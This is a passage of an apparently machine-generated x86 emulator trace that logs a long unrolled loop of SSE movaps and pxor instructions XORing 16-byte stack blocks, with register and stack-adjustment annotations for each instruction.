123], regs_write: () adjusting stack for ESP -0x4 and offset 0x94e0 for stack size 0x10000 saving data to stack: 0 16 0x4048fb: movaps xmm1, xmmword ptr [esp + 0x14f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x94f0 for stack size 0x10000 0x404903: pxor xmm1, xmmword ptr [esp + 0x1c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x81c0 for stack size 0x10000 0x40490c: movaps xmmword ptr [esp + 0x14f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x94f0 for stack size 0x10000 saving data to stack: 0 16 0x404914: movaps xmm1, xmmword ptr [esp + 0x1500], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9500 for stack size 0x10000 0x40491c: pxor xmm1, xmmword ptr [esp + 0x1d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x81d0 for stack size 0x10000 0x404925: movaps xmmword ptr [esp + 0x1500], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9500 for stack size 0x10000 saving data to stack: 0 16 0x40492d: movaps xmm1, xmmword ptr [esp + 0x1510], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9510 for stack size 0x10000 0x404935: pxor xmm1, xmmword ptr [esp + 0x1e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x81e0 for stack size 0x10000 0x40493e: movaps xmmword ptr [esp + 0x1510], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9510 for stack size 0x10000 saving data to stack: 0 16 0x404946: movaps xmm1, xmmword ptr [esp + 0x1520], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9520 for stack size 0x10000 0x40494e: pxor xmm1, xmmword ptr [esp + 0x1f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x81f0 for stack size 0x10000 0x404957: movaps xmmword ptr [esp + 0x1520], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9520 for stack size 0x10000 saving data to stack: 0 16 0x40495f: movaps xmm1, xmmword ptr [esp + 0x1530], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9530 for stack size 0x10000 0x404967: pxor xmm1, xmmword ptr [esp + 0x200], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8200 for stack size 0x10000 0x404970: movaps xmmword ptr [esp + 0x1530], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9530 for stack size 0x10000 saving data to stack: 0 16 0x404978: movaps xmm1, xmmword ptr [esp + 0x1540], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9540 for stack size 0x10000 0x404980: pxor xmm1, xmmword ptr [esp + 0x210], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8210 for stack size 0x10000 0x404989: movaps xmmword ptr [esp + 0x1540], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9540 for stack size 0x10000 saving data to stack: 0 16 0x404991: movaps xmm1, xmmword ptr [esp + 0x1550], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9550 for stack size 0x10000 0x404999: pxor xmm1, xmmword ptr [esp + 0x220], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8220 for stack size 0x10000 0x4049a2: movaps xmmword ptr [esp + 0x1550], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9550 for stack size 0x10000 saving data to stack: 0 16 0x4049aa: movaps xmm1, xmmword ptr [esp + 0x1560], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9560 for stack size 0x10000 0x4049b2: pxor xmm1, xmmword ptr [esp + 0x230], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8230 for stack size 0x10000 0x4049bb: movaps xmmword ptr [esp + 0x1560], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9560 for stack size 0x10000 saving data to stack: 0 16 0x4049c3: movaps xmm1, xmmword ptr [esp + 0x1570], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9570 for stack size 0x10000 0x4049cb: pxor xmm1, xmmword ptr [esp + 0x240], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8240 for stack size 0x10000 0x4049d4: movaps xmmword ptr [esp + 0x1570], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9570 for stack size 0x10000 saving data to stack: 0 16 0x4049dc: movaps xmm1, xmmword ptr [esp + 0x1580], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9580 for stack size 0x10000 0x4049e4: pxor xmm1, xmmword ptr [esp + 0x250], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8250 for stack size 0x10000 0x4049ed: movaps xmmword ptr [esp + 0x1580], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9580 for stack size 0x10000 saving data to stack: 0 16 0x4049f5: movaps xmm1, xmmword ptr [esp + 0x1590], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9590 for stack size 0x10000 0x4049fd: pxor xmm1, xmmword ptr [esp + 0x260], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8260 for stack size 0x10000 0x404a06: movaps xmmword ptr [esp + 0x1590], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9590 for stack size 0x10000 saving data to stack: 0 16 0x404a0e: movaps xmm1, xmmword ptr [esp + 0x15a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x95a0 for stack size 0x10000 0x404a16: pxor xmm1, xmmword ptr [esp + 0x270], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8270 for stack size 0x10000 0x404a1f: movaps xmmword ptr [esp + 0x15a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x95a0 for stack size 0x10000 saving data to stack: 0 16 0x404a27: movaps xmm1, xmmword ptr [esp + 0x15b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x95b0 for stack size 0x10000 0x404a2f: pxor xmm1, xmmword ptr [esp + 0x280], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8280 for stack size 0x10000 0x404a38: movaps xmmword ptr [esp + 0x15b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x95b0 for stack size 0x10000 saving data to stack: 0 16 0x404a40: movaps xmm1, xmmword ptr [esp + 0x15c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x95c0 for stack size 0x10000 0x404a48: pxor xmm1, xmmword ptr [esp + 0x290], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8290 for stack size 0x10000 0x404a51: movaps xmmword ptr [esp + 0x15c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x95c0 for stack size 0x10000 saving data to stack: 0 16 0x404a59: movaps xmm1, xmmword ptr [esp + 0x15d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x95d0 for stack size 0x10000 0x404a61: pxor xmm1, xmmword ptr [esp + 0x2a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x82a0 for stack size 0x10000 0x404a6a: movaps xmmword ptr [esp + 0x15d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x95d0 for stack size 0x10000 saving data to stack: 0 16 0x404a72: movaps xmm1, xmmword ptr [esp + 0x15e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x95e0 for stack size 0x10000 0x404a7a: pxor xmm1, xmmword ptr [esp + 0x2b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x82b0 for stack size 0x10000 0x404a83: movaps xmmword ptr [esp + 0x15e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x95e0 for stack size 0x10000 saving data to stack: 0 16 0x404a8b: movaps xmm1, xmmword ptr [esp + 0x15f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x95f0 for stack size 0x10000 0x404a93: pxor xmm1, xmmword ptr [esp + 0x2c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x82c0 for stack size 0x10000 0x404a9c: movaps xmmword ptr [esp + 0x15f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x95f0 for stack size 0x10000 saving data to stack: 0 16 0x404aa4: movaps xmm1, xmmword ptr [esp + 0x1600], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9600 for stack size 0x10000 0x404aac: pxor xmm1, xmmword ptr [esp + 0x2d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x82d0 for stack size 0x10000 0x404ab5: movaps xmmword ptr [esp + 0x1600], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9600 for stack size 0x10000 saving data to stack: 0 16 0x404abd: movaps xmm1, xmmword ptr [esp + 0x1610], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9610 for stack size 0x10000 0x404ac5: pxor xmm1, xmmword ptr [esp + 0x2e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x82e0 for stack size 0x10000 0x404ace: movaps xmmword ptr [esp + 0x1610], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9610 for stack size 0x10000 saving data to stack: 0 16 0x404ad6: movaps xmm1, xmmword ptr [esp + 0x1620], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9620 for stack size 0x10000 0x404ade: pxor xmm1, xmmword ptr [esp + 0x2f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x82f0 for stack size 0x10000 0x404ae7: movaps xmmword ptr [esp + 0x1620], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9620 for stack size 0x10000 saving data to stack: 0 16 0x404aef: movaps xmm1, xmmword ptr [esp + 0x1630], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9630 for stack size 0x10000 0x404af7: pxor xmm1, xmmword ptr [esp + 0x300], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8300 for stack size 0x10000 0x404b00: movaps xmmword ptr [esp + 0x1630], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9630 for stack size 0x10000 saving data to stack: 0 16 0x404b08: movaps xmm1, xmmword ptr [esp + 0x1640], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9640 for stack size 0x10000 0x404b10: pxor xmm1, xmmword ptr [esp + 0x310], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8310 for stack size 0x10000 0x404b19: movaps xmmword ptr [esp + 0x1640], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9640 for stack size 0x10000 saving data to stack: 0 16 0x404b21: movaps xmm1, xmmword ptr [esp + 0x1650], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9650 for stack size 0x10000 0x404b29: pxor xmm1, xmmword ptr [esp + 0x320], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8320 for stack size 0x10000 0x404b32: movaps xmmword ptr [esp + 0x1650], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9650 for stack size 0x10000 saving data to stack: 0 16 0x404b3a: movaps xmm1, xmmword ptr [esp + 0x1660], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9660 for stack size 0x10000 0x404b42: pxor xmm1, xmmword ptr [esp + 0x330], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8330 for stack size 0x10000 0x404b4b: movaps xmmword ptr [esp + 0x1660], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9660 for stack size 0x10000 saving data to stack: 0 16 0x404b53: movaps xmm1, xmmword ptr [esp + 0x1670], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9670 for stack size 0x10000 0x404b5b: pxor xmm1, xmmword ptr [esp + 0x340], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8340 for stack size 0x10000 0x404b64: movaps xmmword ptr [esp + 0x1670], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9670 for stack size 0x10000 saving data to stack: 0 16 0x404b6c: movaps xmm1, xmmword ptr [esp + 0x1680], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9680 for stack size 0x10000 0x404b74: pxor xmm1, xmmword ptr [esp + 0x350], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8350 for stack size 0x10000 0x404b7d: movaps xmmword ptr [esp + 0x1680], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9680 for stack size 0x10000 saving data to stack: 0 16 0x404b85: movaps xmm1, xmmword ptr [esp + 0x1690], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9690 for stack size 0x10000 0x404b8d: pxor xmm1, xmmword ptr [esp + 0x360], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8360 for stack size 0x10000 0x404b96: movaps xmmword ptr [esp + 0x1690], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9690 for stack size 0x10000 saving data to stack: 0 16 0x404b9e: movaps xmm1, xmmword ptr [esp + 0x16a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x96a0 for stack size 0x10000 0x404ba6: pxor xmm1, xmmword ptr [esp + 0x370], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8370 for stack size 0x10000 0x404baf: movaps xmmword ptr [esp + 0x16a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x96a0 for stack size 0x10000 saving data to stack: 0 16 0x404bb7: movaps xmm1, xmmword ptr [esp + 0x16b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x96b0 for stack size 0x10000 0x404bbf: pxor xmm1, xmmword ptr [esp + 0x380], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8380 for stack size 0x10000 0x404bc8: movaps xmmword ptr [esp + 0x16b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x96b0 for stack size 0x10000 saving data to stack: 0 16 0x404bd0: movaps xmm1, xmmword ptr [esp + 0x16c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x96c0 for stack size 0x10000 0x404bd8: pxor xmm1, xmmword ptr [esp + 0x390], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8390 for stack size 0x10000 0x404be1: movaps xmmword ptr [esp + 0x16c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x96c0 for stack size 0x10000 saving data to stack: 0 16 0x404be9: movaps xmm1, xmmword ptr [esp + 0x16d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x96d0 for stack size 0x10000 0x404bf1: pxor xmm1, xmmword ptr [esp + 0x3a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x83a0 for stack size 0x10000 0x404bfa: movaps xmmword ptr [esp + 0x16d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x96d0 for stack size 0x10000 saving data to stack: 0 16 0x404c02: movaps xmm1, xmmword ptr [esp + 0x16e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x96e0 for stack size 0x10000 0x404c0a: pxor xmm1, xmmword ptr [esp + 0x3b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x83b0 for stack size 0x10000 0x404c13: movaps xmmword ptr [esp + 0x16e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x96e0 for stack size 0x10000 saving data to stack: 0 16 0x404c1b: movaps xmm1, xmmword ptr [esp + 0x16f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x96f0 for stack size 0x10000 0x404c23: pxor xmm1, xmmword ptr [esp + 0x3c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x83c0 for stack size 0x10000 0x404c2c: movaps xmmword ptr [esp + 0x16f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x96f0 for stack size 0x10000 saving data to stack: 0 16 0x404c34: movaps xmm1, xmmword ptr [esp + 0x1700], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9700 for stack size 0x10000 0x404c3c: pxor xmm1, xmmword ptr [esp + 0x3d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x83d0 for stack size 0x10000 0x404c45: movaps xmmword ptr [esp + 0x1700], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9700 for stack size 0x10000 saving data to stack: 0 16 0x404c4d: movaps xmm1, xmmword ptr [esp + 0x1710], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9710 for stack size 0x10000 0x404c55: pxor xmm1, xmmword ptr [esp + 0x3e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x83e0 for stack size 0x10000 0x404c5e: movaps xmmword ptr [esp + 0x1710], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9710 for stack size 0x10000 saving data to stack: 0 16 0x404c66: movaps xmm1, xmmword ptr [esp + 0x1720], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9720 for stack size 0x10000 0x404c6e: pxor xmm1, xmmword ptr [esp + 0x3f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x83f0 for stack size 0x10000 0x404c77: movaps xmmword ptr [esp + 0x1720], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9720 for stack size 0x10000 saving data to stack: 0 16 0x404c7f: movaps xmm1, xmmword ptr [esp + 0x1730], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9730 for stack size 0x10000 0x404c87: pxor xmm1, xmmword ptr [esp + 0x400], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8400 for stack size 0x10000 0x404c90: movaps xmmword ptr [esp + 0x1730], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9730 for stack size 0x10000 saving data to stack: 0 16 0x404c98: movaps xmm1, xmmword ptr [esp + 0x1740], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9740 for stack size 0x10000 0x404ca0: pxor xmm1, xmmword ptr [esp + 0x410], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8410 for stack size 0x10000 0x404ca9: movaps xmmword ptr [esp + 0x1740], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9740 for stack size 0x10000 saving data to stack: 0 16 0x404cb1: movaps xmm1, xmmword ptr [esp + 0x1750], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9750 for stack size 0x10000 0x404cb9: pxor xmm1, xmmword ptr [esp + 0x420], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8420 for stack size 0x10000 0x404cc2: movaps xmmword ptr [esp + 0x1750], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9750 for stack size 0x10000 saving data to stack: 0 16 0x404cca: movaps xmm1, xmmword ptr [esp + 0x1760], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9760 for stack size 0x10000 0x404cd2: pxor xmm1, xmmword ptr [esp + 0x430], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8430 for stack size 0x10000 0x404cdb: movaps xmmword ptr [esp + 0x1760], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9760 for stack size 0x10000 saving data to stack: 0 16 0x404ce3: movaps xmm1, xmmword ptr [esp + 0x1770], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9770 for stack size 0x10000 0x404ceb: pxor xmm1, xmmword ptr [esp + 0x440], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8440 for stack size 0x10000 0x404cf4: movaps xmmword ptr [esp + 0x1770], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9770 for stack size 0x10000 saving data to stack: 0 16 0x404cfc: movaps xmm1, xmmword ptr [esp + 0x1780], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9780 for stack size 0x10000 0x404d04: pxor xmm1, xmmword ptr [esp + 0x450], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8450 for stack size 0x10000 0x404d0d: movaps xmmword ptr [esp + 0x1780], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9780 for stack size 0x10000 saving data to stack: 0 16 0x404d15: movaps xmm1, xmmword ptr [esp + 0x1790], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9790 for stack size 0x10000 0x404d1d: pxor xmm1, xmmword ptr [esp + 0x460], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8460 for stack size 0x10000 0x404d26: movaps xmmword ptr [esp + 0x1790], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9790 for stack size 0x10000 saving data to stack: 0 16 0x404d2e: movaps xmm1, xmmword ptr [esp + 0x17a0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x97a0 for stack size 0x10000 0x404d36: pxor xmm1, xmmword ptr [esp + 0x470], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8470 for stack size 0x10000 0x404d3f: movaps xmmword ptr [esp + 0x17a0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x97a0 for stack size 0x10000 saving data to stack: 0 16 0x404d47: movaps xmm1, xmmword ptr [esp + 0x17b0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x97b0 for stack size 0x10000 0x404d4f: pxor xmm1, xmmword ptr [esp + 0x480], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8480 for stack size 0x10000 0x404d58: movaps xmmword ptr [esp + 0x17b0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x97b0 for stack size 0x10000 saving data to stack: 0 16 0x404d60: movaps xmm1, xmmword ptr [esp + 0x17c0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x97c0 for stack size 0x10000 0x404d68: pxor xmm1, xmmword ptr [esp + 0x490], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8490 for stack size 0x10000 0x404d71: movaps xmmword ptr [esp + 0x17c0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x97c0 for stack size 0x10000 saving data to stack: 0 16 0x404d79: movaps xmm1, xmmword ptr [esp + 0x17d0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x97d0 for stack size 0x10000 0x404d81: pxor xmm1, xmmword ptr [esp + 0x4a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x84a0 for stack size 0x10000 0x404d8a: movaps xmmword ptr [esp + 0x17d0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x97d0 for stack size 0x10000 saving data to stack: 0 16 0x404d92: movaps xmm1, xmmword ptr [esp + 0x17e0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x97e0 for stack size 0x10000 0x404d9a: pxor xmm1, xmmword ptr [esp + 0x4b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x84b0 for stack size 0x10000 0x404da3: movaps xmmword ptr [esp + 0x17e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x97e0 for stack size 0x10000 saving data to stack: 0 16 0x404dab: movaps xmm1, xmmword ptr [esp + 0x17f0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x97f0 for stack size 0x10000 0x404db3: pxor xmm1, xmmword ptr [esp + 0x4c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x84c0 for stack size 0x10000 0x404dbc: movaps xmmword ptr [esp + 0x17f0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x97f0 for stack size 0x10000 saving data to stack: 0 16 0x404dc4: movaps xmm1, xmmword ptr [esp + 0x1800], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9800 for stack size 0x10000 0x404dcc: pxor xmm1, xmmword ptr [esp + 0x4d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x84d0 for stack size 0x10000 0x404dd5: movaps xmmword ptr [esp + 0x1800], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9800 for stack size 0x10000 saving data to stack: 0 16 0x404ddd: movaps xmm1, xmmword ptr [esp + 0x1810], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9810 for stack size 0x10000 0x404de5: pxor xmm1, xmmword ptr [esp + 0x4e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x84e0 for stack size 0x10000 0x404dee: movaps xmmword ptr [esp + 0x1810], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9810 for stack size 0x10000 saving data to stack: 0 16 0x404df6: movaps xmm1, xmmword ptr [esp + 0x1820], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9820 for stack size 0x10000 0x404dfe: pxor xmm1, xmmword ptr [esp + 0x4f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x84f0 for stack size 0x10000 0x404e07: movaps xmmword ptr [esp + 0x1820], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9820 for stack size 0x10000 saving data to stack: 0 16 0x404e0f: movaps xmm1, xmmword ptr [esp + 0x1830], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9830 for stack size 0x10000 0x404e17: pxor xmm1, xmmword ptr [esp + 0x500], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8500 for stack size 0x10000 0x404e20: movaps xmmword ptr [esp + 0x1830], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9830 for stack size 0x10000 saving data to stack: 0 16 0x404e28: movaps xmm1, xmmword ptr [esp + 0x1840], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9840 for stack size 0x10000 0x404e30: pxor xmm1, xmmword ptr [esp + 0x510], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8510 for stack size 0x10000 0x404e39: movaps xmmword ptr [esp + 0x1840], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9840 for stack size 0x10000 saving data to stack: 0 16 0x404e41: movaps xmm1, xmmword ptr [esp + 0x1850], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9850 for stack size 0x10000 0x404e49: pxor xmm1, xmmword ptr [esp + 0x520], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8520 for stack size 0x10000 0x404e52: movaps xmmword ptr [esp + 0x1850], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9850 for stack size 0x10000 saving data to stack: 0 16 0x404e5a: movaps xmm1, xmmword ptr [esp + 0x1860], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9860 for stack size 0x10000 0x404e62: pxor xmm1, xmmword ptr [esp + 0x530], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8530 for stack size 0x10000 0x404e6b: movaps xmmword ptr [esp + 0x1860], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9860 for stack size 0x10000 saving data to stack: 0 16 0x404e73: movaps xmm1, xmmword ptr [esp + 0x1870], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9870 for stack size 0x10000 0x404e7b: pxor xmm1, xmmword ptr [esp + 0x540], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8540 for stack size 0x10000 0x404e84: movaps xmmword ptr [esp + 0x1870], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9870 for stack size 0x10000 saving data to stack: 0 16 0x404e8c: movaps xmm1, xmmword ptr [esp + 0x1880], 